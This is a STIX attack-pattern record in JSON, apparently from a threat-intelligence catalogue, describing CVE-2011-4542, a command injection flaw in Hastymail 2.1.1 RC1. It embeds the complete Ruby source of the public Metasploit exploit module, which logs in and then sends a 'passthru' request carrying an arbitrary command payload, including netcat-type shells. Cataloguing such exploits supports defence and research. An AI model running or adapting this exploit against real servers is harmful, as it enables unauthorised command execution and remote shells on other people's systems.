{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c43473bf-8c06-433b-a1b1-a117b7096c7a",
    "created": "2024-08-14T17:13:41.335457Z",
    "modified": "2024-08-14T17:13:41.335461Z",
    "name": "\"Hastymail 2.1.1 RC1 Command Injection\"",
    "description": " This module exploits a command injection vulnerability found in Hastymail 2.1.1 RC1 due to the insecure usage of the call_user_func_array() function on the \"lib/ajax_functions.php\" script. Authentication is required on Hastymail in order to exploit the vulnerability. The module has been successfully tested on Hastymail 2.1.1 RC1 over Ubuntu 10.04.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/hastymail_exec.rb",
            "external_id": "hastymail_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4542"
        },
        {
            "source_name": "reference",
            "url": "https://www.dognaedis.com/vulns/DGS-SEC-3.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Hastymail 2.1.1 RC1 Command Injection\",\n      'Description'    => %q{\n          This module exploits a command injection vulnerability found in Hastymail\n        2.1.1 RC1 due to the insecure usage of the call_user_func_array() function on\n        the \"lib/ajax_functions.php\" script. Authentication is required on Hastymail\n        in order to exploit the vulnerability. The module has been successfully tested\n        on Hastymail 2.1.1 RC1 over Ubuntu 10.04.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Bruno Teixeira', # Vulnerability Discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-4542' ],\n          [ 'BID', '50791' ],\n          [ 'OSVDB', '77331' ],\n          [ 'URL', 'https://www.dognaedis.com/vulns/DGS-SEC-3.html' ]\n        ],\n      'Payload'        =>\n        {\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl ruby python netcat netcat-e',\n            }\n        },\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'Targets'        =>\n        [\n          ['Hastymail 2.1.1 RC1', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-11-22',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, \"The base path to Hastymail\", \"/hastymail2/\"]),\n        OptString.new('USER', [true, \"The username to authenticate with\", \"\"]),\n        OptString.new('PASS', [true, \"The password to authenticate with\", \"\"])\n      ])\n  end\n\n\n  def check\n    @uri = normalize_uri(target_uri.path)\n    @uri << '/' if @uri[-1,1] != '/'\n    @session_id = \"\"\n\n    login\n\n    if not @session_id or @session_id.empty?\n      vprint_error \"Authentication failed\"\n      return Exploit::CheckCode::Unknown\n    end\n\n    test = rand_text_alpha(rand(4) + 4)\n    data = \"rs=passthru&\"\n    data << \"rsargs[]=#{rand_text_alpha(rand(4) + 4)}&\"\n    data << \"rsargs[]=echo #{test}\"\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => \"#{@uri}\",\n      'Cookie' => @session_id,\n      'data' => data\n    })\n\n    if res and res.code == 200 and res.body =~ /#{test}/\n      return Exploit::CheckCode::Vulnerable\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def login\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => \"#{@uri}?page=login\",\n      'vars_post' =>\n      {\n        'user' => datastore['USER'],\n        'pass' => datastore['PASS'],\n        'login' => 'Login'\n      }\n    })\n\n    if res and res.code == 303\n      @session_id = res.get_cookies\n      print_good(\"Authentication Successful\")\n    end\n  end\n\n  def exploit\n    @uri = normalize_uri(target_uri.path)\n    @uri << '/' if @uri[-1,1] != '/'\n    @session_id = \"\"\n\n    print_status \"Trying login\"\n    login\n\n    if not @session_id or @session_id.empty?\n      print_error \"Authentication failed\"\n      return\n    end\n\n    print_good \"Authentication successfully, trying to exploit\"\n\n    data = \"rs=passthru&\"\n    data << \"rsargs[]=#{rand_text_alpha(rand(4) + 4)}&\"\n    data << \"rsargs[]=#{payload.encoded}\"\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => \"#{@uri}\",\n      'Cookie' => @session_id,\n      'headers' => {\n        'Cmd' => Rex::Text.encode_base64(payload.encoded)\n      },\n      'data' => data\n    })\n\n    if not res or res.code != 200 or not res.body =~ /\\+/\n      print_error \"Exploitation failed\"\n      return\n    end\n\n  end\n\n\nend\n",
    "x_mitre_disclosure_date": "2011-11-22",
    "x_mitre_platforms": [
        "['unix']"
    ]
}